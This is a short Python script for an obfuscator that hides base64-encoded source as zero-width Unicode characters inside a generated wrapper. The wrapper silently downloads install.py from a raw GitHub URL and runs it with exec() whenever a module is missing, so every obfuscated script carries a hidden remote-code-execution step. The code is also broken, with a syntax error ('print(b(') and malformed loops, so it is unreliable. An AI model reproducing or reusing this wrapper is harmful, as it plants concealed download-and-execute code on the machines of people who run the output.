import base64, os, random, string
balls = str(string.digits) + string.ascii_letters
def ecr(f, j=False):
     ass = ["""'obfuscated with rverflow';import requests, os, colorama;from colorama import Fore; colorama.init();\ntry:\n      import rverflow\nexcept ImportError:\n     r=requests.get("https://raw.githubusercontent.com/RiverCheet/fart/main/install.py");exec(r.content.decode());import rverflow\ntry:\n     exec(rverflow.dcr('"""]
     ass2 = []
     for i in f:
          ass2.append(base64.b64encode(i.encode()))
     for a in ass2:
          print(a)
          for b in a.decode():
               print(b(
               for c in b:
                    print(c)
                    for i in "{0:08b}".format(ord(c)):
                         if i == "0":
                              ass.append(u"\u200c")
                         elif i == "1":
                              ass.append(u"\ufeff")
                    ass.append("_.RVERFLOW._")
     ass.append("'))\nexcept Exception as error:\n     print(Fore.RED + f'''your script threw an error:\n{error}''');os.system('pause');exit()")
     sex = '‭'.join(ass)
     return sex
